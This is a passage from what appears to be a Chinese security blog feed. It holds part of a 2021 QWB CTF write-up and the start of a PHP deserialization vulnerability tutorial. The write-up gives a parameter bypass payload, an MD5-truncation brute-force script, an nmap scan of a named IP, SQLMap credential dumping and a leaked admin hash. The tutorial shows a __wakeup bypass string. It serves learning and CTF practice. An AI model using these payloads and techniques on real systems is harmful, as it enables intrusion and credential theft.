&lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;第四层&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(strlen(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=json_decode(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y</span> = <span class="variable">$b</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y</span> === <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;第五层&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>非数字且大于1024，1025a可绕过</p></li><li><p>科学计数法绕过</p></li><li><p>md5截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span>  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;4bf21cd&#x27;</span>   <span class="comment">#已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>   <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmd5</span>(<span class="params">sss</span>):</span>    <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])   <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">7</span>] == keymd5:            <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            print(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[]  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):   <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findmd5, <span class="built_in">list</span>) <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure></li><li><p>字母或浮点数绕过</p></li><li><p>让json解析为假即可</p></li></ol><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ppp[number1]&#x3D;1025a&amp;ppp[number2]&#x3D;1e9&amp;ppp[number3]&#x3D;61823470&amp;ppp[number4]&#x3D;abcdefg&amp;ppp[number5]&#x3D;&#123;&#39;key&#39;:0&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210617224538860.png" alt="image-20210617224538860"></p><p><strong>key2</strong></p><p>一开始确实没想到key2直接在一大堆doc文件中，里面还有几张图片迷惑，我是fw</p><p>早写个脚本找多好(参考wp)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> docx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    file_list = []</span><br><span class="line">    <span class="keyword">for</span> top, dirs, non_dirs <span class="keyword">in</span> os.walk(file_path):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> non_dirs:</span><br><span class="line">            file_list.append(os.path.join(top, item))</span><br><span class="line">    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docx_list = <span class="built_in">filter</span>(<span class="keyword">lambda</span> s: s.endswith(<span class="string">&#x27;.docx&#x27;</span>), dir_file(<span class="string">&#x27;five_month&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> docx_file <span class="keyword">in</span> docx_list:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        docx_object = docx.Document(docx_file)</span><br><span class="line">    <span class="keyword">except</span> docx.opc.exceptions.PackageNotFoundError:</span><br><span class="line">        print(<span class="string">&#x27;open failed: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(docx_file))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> para <span class="keyword">in</span> docx_object.paragraphs:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;KEY2&quot;</span> <span class="keyword">in</span> para.text:</span><br><span class="line">            print(docx_file)</span><br><span class="line">            print(para.text)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210617235601924.png" alt="image-20210617235601924"></p><p>提交两个key即可获得 flag</p><h1 id="0x04-EasyWeb"><a href="#0x04-EasyWeb" class="headerlink" title="0x04 EasyWeb"></a>0x04 EasyWeb</h1><p>目录爆破得到 /hint</p><p>访问后得到提示，Try to scan 35000-40000 ^ __ ^</p><p>使用nmap进行端口扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 47.104.136.46 -p35000-40000</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1623502207351-bf340032-e7d3-4bd5-9815-84869a122daa.png" alt="image.png"></p><p>访问后使用SQLMap在登录处一把梭，拿到帐号密码</p><p>admin/99f609527226e076d668668582ac4420</p><p>进入后台，找到一处文件上传点，但比赛中没能利用成功，止于此（上传姿势还得多看看）。</p><h1 id="0x05-wp"><a href="#0x05-wp" class="headerlink" title="0x05 wp"></a>0x05 wp</h1><p>[1] <a href="https://tari.moe/2021/06/14/2021qwb/index.html?_sw-precache=fb28550fbbe7e700e9ae4688ad1e8925">2021强网杯 Web Writeup</a></p><p>[2] <a href="https://mp.weixin.qq.com/s/t6e64RrO3pwqAl-8a50-oA">强网杯-WriteUp by ChaMd5</a></p>]]></content>
      
      
      <categories>
          
          <category> 赛题再现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> qwb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化漏洞学习</title>
      <link href="posts/46951.html"/>
      <url>posts/46951.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531173450710.png" alt="image-20210531173450710"></p><ul><li>序列化（serialize）：将对象转换为字符串</li><li>反序列化（unserialize）：将字符串转换为对象</li></ul><p><strong>注意：</strong></p><p>php序列化是为了在程序运行的过程中方便对象转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。</p><p><strong>简单例子</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Students</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student1</span>=<span class="keyword">new</span> Students(<span class="string">&quot;zhansan&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=serialize(<span class="variable">$student1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;序列化：\n&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>=unserialize(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化：\n&quot;</span>;</span><br><span class="line">print_r(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531181114482.png" alt="image-20210531181114482"></p><p>PHP序列化字符串释义（注意：此时类的属性为public）：</p><ul><li>O:Object</li><li>8：对象所属类名长度</li><li>Students：对象所属类名</li><li>2：类中的两个属性</li><li>s:string</li><li>4：属性名长度</li><li>name:属性名</li><li>i:int</li></ul><p><strong>漏洞产生原因：</strong></p><p>在PHP代码中使用<code>unserialize</code>函数反序列化某一个对象，该对象被调用时自动执行自定义的魔法方法，如果这些魔法方法中有危险的操作或者在魔法方法中去调用类中其他带有危险操作的函数且如果危险操作是我们可控的，那么就可能会触发php反序列化漏洞。</p><h1 id="PHP魔法函数"><a href="#PHP魔法函数" class="headerlink" title="PHP魔法函数"></a>PHP魔法函数</h1><h2 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h2><p>当对象被创建时会自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used construct!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出 used construct!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h2><p>当对象被销毁时会自动调用，反序列化常见起点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used destruct!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出 used destruct!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h2><p>当执行serialize()时，先会调用这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used sleep!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span>=serialize(<span class="variable">$person1</span>);</span><br><span class="line"><span class="comment">// 输出 used sleep!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h2><p>当执行unserialize()时，先会调用这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span>=serialize(<span class="variable">$person1</span>);</span><br><span class="line"><span class="variable">$obj</span>=unserialize(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 输出 used wakeup!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PS： <code>__wakeup()</code>方法绕过</p><p>当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过<code>__wakeup</code> 函数的执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;zhangsan&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><p> 其中Person后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过<code>__wakeup()</code> 函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;zhangsan&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h2><p>当反序列化后的对象被转换成字符串处理时自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;used toString!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span>=serialize(<span class="variable">$person1</span>);</span><br><span class="line"><span class="variable">$obj</span>=unserialize(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="comment">// 输出 used toString!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PS： <code>__toString</code>魔法方法触发条件比较多∶</p><ul><li>echo($obj) 打印时触发</li><li>反序列化对象与字符串连接时</li><li>反序列化对象参与格式化字符串时</li><li>反序列化对象与字符串进行 == 比较时（PHP进行==比较时会转换参数类型）</li><li>反序列化对象参与格式化sql语句，绑定参数时</li><li>反序列化对象在经过php字符串函数，如strlen()、addslashes()时</li><li>在in array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回<br>的字符串时toString会被调用</li><li>反序列化对象作为class_exists()的参数时</li></ul><h2 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h2><p>当从不可访问的属性（private或没有的属性）中读取数据时自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$sex</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used get!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person1</span>-&gt;sex</span><br><span class="line"><span class="comment">// 输出 used get!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h2><p>当给不可访问的属性赋值时自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$sex</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$naem</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span 